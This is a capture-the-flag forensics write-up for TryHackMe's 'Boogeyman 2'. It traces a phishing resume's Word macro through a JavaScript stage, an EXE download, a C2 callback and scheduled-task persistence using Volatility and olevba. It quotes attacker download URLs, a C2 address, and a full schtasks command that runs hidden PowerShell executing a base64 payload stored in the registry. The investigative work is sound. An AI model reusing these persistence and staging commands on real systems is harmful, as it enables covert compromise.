Boogeyman 2: Following the Evidence from Phishing Email to Persistence

This writeup documents the investigation flow: what I saw in each artifact, why it mattered, which command I ran next, and how each finding led to the final answers.

Room
Boogeyman 2
Platform
TryHackMe
Focus
SOC / DFIR
Artifacts
EML, DOC, Memory Dump
Tools
olevba, Volatility, strings
Core idea
Correlate, do not guess
Investigation goal: prove how the HR workstation was compromised, identify what the Word document executed, confirm it in memory, find the binary and C2 connection, then recover how the attacker maintained access.

Scenario Overview

Maxine Beck, an HR employee at Quick Logistics LLC, received a resume application email. At first glance, that does not look strange because HR staff normally receive resumes from external applicants. That is what made the lure believable.

I did not start by answering the questions one by one. I first tried to rebuild the intrusion in order:

Email → Word attachment → Macro → JavaScript stage → EXE payload → C2 callback → Scheduled task persistence

How I Approached the Case

  1. Read the visible evidence first. Sender, recipient, attachment, process parent, command line, network owner.
  2. Ask what the evidence proves. A macro proves intent. A process tree proves execution. A socket proves communication.
  3. Choose the next command with a purpose. Each command should answer a specific question.
  4. Correlate before concluding. I only treated something as confirmed when it matched the chain across at least one strong artifact source.
Rule I followed: I can use VirusTotal or sandbox output to guide the investigation, but I should not rely on reputation alone. The strongest proof comes from the document, memory dump, command lines and network artifacts.

1. Starting with the Email

The first artifact was the phishing email. I looked for the sender, target, subject and attachment because these fields define the initial access vector.

From: westaylor23@outlook.com
To: maxine.beck@quicklogisticsorg.onmicrosoft.com
Subject: Resume - Application for Junior IT Analyst Role
Attachment: resume_WesleyTaylor.doc

The email fits the victim's role. An HR specialist receiving a resume is normal, so the document could realistically get opened.

Next command choice: I did not open the Word file normally. I moved to file triage and hashing first.

2. Checking the Attachment Without Opening It

file Resume_WesleyTaylor.doc
sha256sum Resume_WesleyTaylor.doc
md5sum Resume_WesleyTaylor.doc

The file was a legacy Word/OLE document, which is important because .doc files can contain VBA macro streams. The MD5 was:

52c4384a0b9e248b95804352ebec6c5b

I also checked reputation and sandbox context.

The sandbox hinted at a winword.exe → wscript.exe process chain. I kept that in mind, but still needed to prove it from the original artifacts.

3. Reading the Word Macro with olevba

olevba Resume_WesleyTaylor.doc

The macro contained Sub AutoOpen(), which means it runs when the document opens. That changed the document from a suspicious attachment into an execution vector.

Download URL:
https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png

Saved locally as:
C:\ProgramData\update.js

Executed with:
wscript.exe C:\ProgramData\update.js

The interesting part was the mismatch: the remote payload looked like update.png, but the macro saved it as update.js and executed it with wscript.exe. I treated the PNG extension as camouflage.

Next question: did this actually happen on Maxine's machine? That required memory evidence.

4. Validating Execution in Memory

vol -f WKSTN-2961.raw windows.pstree
OUTLOOK.EXE PID 1440
└── WINWORD.EXE PID 1124
    └── wscript.exe PID 4260
        └── updater.exe PID 6216

This matched the macro behavior. Word spawned wscript.exe, and that script led to updater.exe.

vol -f WKSTN-2961.raw windows.cmdline > cmdline.txt
cat cmdline.txt
Attachment runtime path:
C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGCZFT\Resume_WesleyTaylor (002).doc

Stage 2 execution:
wscript.exe C:\ProgramData\update.js

Malicious binary path:
C:\Windows\Tasks\updater.exe

5. Finding What update.js Did Next

vol -f WKSTN-2961.raw windows.filescan > filescan.txt
grep -i "update" filescan.txt

The memory dump showed update[1].png, update[1].exe and \Windows\Tasks\updater.exe. That suggested a staged download: first JavaScript, then executable.

strings WKSTN-2961.raw | grep -i "boogeymanisback"
https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe

I accepted this as the binary download URL because it connected cleanly to update[1].exe in cache and updater.exe running from disk.

6. Proving the C2 Connection

vol -f WKSTN-2961.raw windows.netscan > netscan.txt
grep "6216" netscan.txt
Process: updater.exe
PID: 6216
Remote endpoint: 128.199.95.189:8080

The IP was confirmed as C2 because the connection belonged to the suspicious updater.exe process, not because of reputation alone.

7. Recovering the Persistence Command

I first searched the recovered command lines:

grep -i "schtasks" cmdline.txt
grep -i "tasks" cmdline.txt

That did not recover the full scheduled task creation command. I did not stop there because short-lived commands can exit before memory capture. So I moved to raw strings:

strings -a -n 5 WKSTN-2961.raw > ascii_strings.txt
strings -a -el -n 5 WKSTN-2961.raw > unicode_strings.txt

grep -ni "schtasks" ascii_strings.txt
grep -ni "schtasks" unicode_strings.txt

The ASCII strings were noisy, but the Unicode strings recovered the full command:

schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""

This command creates a task named Updater, runs it daily at 09:00, starts hidden PowerShell, reads an encoded registry value from HKCU:\Software\Microsoft\Windows\CurrentVersion\debug, decodes it as Unicode and executes it with IEX.

How the Answers Were Derived

This section is more detailed than a normal answer dump. I wrote it to show exactly how each answer came from a piece of evidence.

1. Sender and victim email

I started with the email preview. The From field gave the sender and the To field gave the victim. Because the subject was a job application and the recipient was HR, I treated the email as targeted spear phishing.

Sender: westaylor23@outlook.com
Victim: maxine.beck@quicklogisticsorg.onmicrosoft.com

2. Malicious attachment and MD5

The attachment name came from the email and local file. I then used file to confirm it was an OLE Word document and md5sum to get the requested hash.

file Resume_WesleyTaylor.doc
md5sum Resume_WesleyTaylor.doc
Attachment: Resume_WesleyTaylor.doc
MD5: 52c4384a0b9e248b95804352ebec6c5b

3. Stage 2 URL, stage 2 path, and executor

olevba showed that AutoOpen() downloaded update.png, saved it into C:\ProgramData\update.js, then executed it with wscript.exe. The important point is that the remote extension looked like an image, but the saved file was JavaScript.

olevba Resume_WesleyTaylor.doc
Stage 2 URL: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png
Stage 2 path: C:\ProgramData\update.js
Executor: wscript.exe

4. PID and parent PID of stage 2 execution

I used windows.pstree to follow the parent-child chain. wscript.exe had PID 4260, and its parent was WINWORD.EXE PID 1124. This proves the script execution came from the Word document.

vol -f WKSTN-2961.raw windows.pstree
WINWORD.EXE PID 1124
└── wscript.exe PID 4260

5. Full path of the malicious email attachment

The file name alone was not enough because the victim opened it from Outlook. windows.cmdline revealed the real runtime path used by Word.

vol -f WKSTN-2961.raw windows.cmdline > cmdline.txt
grep -i "Resume_WesleyTaylor" cmdline.txt
C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGCZFT\Resume_WesleyTaylor (002).doc

6. Binary URL and malicious C2 process

After updater.exe appeared in the process tree, I searched for file artifacts and strings. filescan showed update[1].exe and updater.exe. A strings search against the attacker domain recovered the binary URL.

vol -f WKSTN-2961.raw windows.filescan > filescan.txt
grep -i "update" filescan.txt
strings WKSTN-2961.raw | grep -i "boogeymanisback"
Binary URL: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe
C2 process path: C:\Windows\Tasks\updater.exe
C2 process PID: 6216

7. C2 IP and port

I did not label the IP as C2 just because it looked suspicious. It became confirmed when windows.netscan showed updater.exe PID 6216 connecting to it.

vol -f WKSTN-2961.raw windows.netscan > netscan.txt
grep "6216" netscan.txt
128.199.95.189:8080

8. Persistence command

windows.cmdline did not recover the full command, so I switched to ASCII and Unicode strings. Unicode strings provided the clean scheduled task command.

strings -a -n 5 WKSTN-2961.raw > ascii_strings.txt
strings -a -el -n 5 WKSTN-2961.raw > unicode_strings.txt
grep -ni "schtasks" unicode_strings.txt
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""

This showed scheduled task persistence with hidden PowerShell and a registry-stored encoded payload.

What I Learned

  • Build the chain first, then answer the questions.
  • Macro output explains intent; memory output proves execution.
  • Parent-child process relationships are one of the fastest ways to validate malicious document execution.
  • Raw strings are useful but noisy. I should only trust strings that correlate with process, file or network evidence.
  • Scheduled task persistence can be paired with registry-stored encoded payloads to reduce obvious files on disk.
